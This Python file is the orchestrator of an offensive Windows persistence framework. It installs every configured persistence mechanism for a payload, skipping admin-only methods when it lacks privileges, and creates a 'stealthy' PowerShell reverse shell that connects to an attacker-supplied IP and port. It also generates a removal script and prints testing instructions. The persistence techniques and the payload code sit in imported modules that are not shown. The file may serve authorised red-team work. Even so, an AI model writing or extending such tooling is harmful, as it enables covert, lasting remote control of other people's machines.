"""
Master orchestrator - coordinates all persistence operations
"""

import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.utils import (
    check_admin,
    validate_payload_path,
    print_section_header,
    print_method_header,
    format_method_summary
)
from core.installer import PersistenceInstaller
from output.removal import RemovalScriptGenerator
from output.tester import PersistenceTester
from config import PERSISTENCE_METHODS


class MasterPersistence:
    """Main orchestrator for comprehensive persistence installation"""
    
    def __init__(self):
        """Initialize master persistence framework"""
        self.is_admin = check_admin()
        self.installer = PersistenceInstaller(self.is_admin)
        self.removal_generator = RemovalScriptGenerator()
        self.tester = PersistenceTester()
    
    def install_comprehensive_persistence(self, payload_path, attacker_ip, attacker_port):
        """
        Install multiple persistence mechanisms for maximum reliability
        
        Args:
            payload_path: Path to payload file
            attacker_ip: Attacker IP address
            attacker_port: Attacker port
        """
        # Validate payload
        if not validate_payload_path(payload_path):
            return False
        
        # Print header
        print_section_header("MASTER WINDOWS PERSISTENCE FRAMEWORK")
        print(f"Target Payload: {payload_path}")
        print(f"Attacker: {attacker_ip}:{attacker_port}")
        print(f"Admin Privileges: {'Yes' if self.is_admin else 'No'}")
        print("=" * 60 + "\n")
        
        # Install each method
        method_number = 1
        for method_key, method_info in PERSISTENCE_METHODS.items():
            # Skip admin-only methods if not admin
            if method_info['requires_admin'] and not self.is_admin:
                continue
            
            # Print method header
            print_method_header(method_number, method_info['name'])
            
            # Install method
            success, message = self.installer.install_method(method_key, payload_path)
            
            # Print result
            print(format_method_summary(method_info['name'], success, message))
            print()
            
            method_number += 1
        
        # Print summary
        self._print_installation_summary()
        
        # Generate removal script
        installed = self.installer.get_installed_methods()
        self.removal_generator.generate_removal_script(installed)
        
        return True
    
    def _print_installation_summary(self):
        """Print summary of installation results"""
        installed = self.installer.get_installed_methods()
        
        print_section_header("PERSISTENCE INSTALLATION COMPLETE")
        print(f"[+] Successfully installed {len(installed)} persistence methods\n")
        
        for i, method in enumerate(installed, 1):
            print(f"{i}. {method.get('method', 'Unknown method')}")
        print()
    
    def test_persistence(self):
        """Display testing instructions"""
        installed = self.installer.get_installed_methods()
        self.tester.display_testing_instructions(installed)
    
    def create_payload(self, attacker_ip, attacker_port):
        """
        Create PowerShell reverse shell payload
        
        Args:
            attacker_ip: Attacker IP
            attacker_port: Attacker port
            
        Returns:
            str: Path to created payload, or None on failure
        """
        try:
            from registry_persistence import RegistryPersistence
            reg = RegistryPersistence()
            
            payload_path = reg.create_stealthy_payload(
                "",
                attacker_ip,
                attacker_port
            )
            
            return payload_path
            
        except ImportError:
            print("[!] registry_persistence module not found")
            return None
        except Exception as e:
            print(f"[!] Payload creation failed: {e}")
            return None